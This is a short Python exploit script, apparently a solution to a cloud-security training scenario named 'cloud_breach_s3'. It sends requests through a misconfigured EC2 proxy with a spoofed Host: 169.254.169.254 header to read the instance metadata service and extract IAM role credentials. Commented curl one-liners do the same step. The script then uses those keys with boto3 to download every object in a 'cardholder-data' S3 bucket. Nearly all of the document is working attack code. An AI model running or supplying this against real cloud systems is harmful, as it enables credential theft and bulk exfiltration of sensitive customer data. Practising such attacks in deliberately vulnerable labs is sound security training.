#Scene2 cloud_breach_s3
#curl -s http://3.84.218.18/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
#curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
import urllib.request
import json
import boto3
from pprint import pprint
#ec2_role = urllib.request.urlopen('http://xx.xx.xx.yy/latest/meta-data/iam/security-credentials/').read().decode()
url1 = 'http://XX.XX.XXX.XX/latest/meta-data/iam/security-credentials/'
request1 = urllib.request.Request(url1)
request1.add_header('Host', '169.254.169.254')
response1 = urllib.request.urlopen(request1)
ec2_role = str(response1.read().decode('utf-8'))

url2 = url1+ec2_role
request2 = urllib.request.Request(url2)
request2.add_header('Host', '169.254.169.254')
response2 = urllib.request.urlopen(request2)
ec2_secret = response2.read().decode()
ec2_cred = json.loads(ec2_secret)

token = ec2_cred['Token']
access_key_id = ec2_cred['AccessKeyId']
secret_access_key = ec2_cred['SecretAccessKey']


ec2_session = boto3.session.Session(aws_access_key_id=access_key_id, aws_secret_access_key=secret_access_key, aws_session_token=token, profile_name='erratic')
#print(ec2_session.get_available_services())
#print(ec2_session.get_available_regions(service_name='s3'))
s3_cli = ec2_session.client(service_name='s3')
#for bucket in s3_cli.list_buckets()['Buckets']:
    #print(bucket['Name'])
#print(ec2_session.profile_name)
for bucket_content in s3_cli.list_objects(Bucket='cg-cardholder-data-bucket-cgid8yimpo8qgx')['Contents']:
     s3_cli.download_file('cg-cardholder-data-bucket-cgid8yimpo8qgx', f'{bucket_content["Key"]}', f'/Users/palkau/{bucket_content["Key"]}')
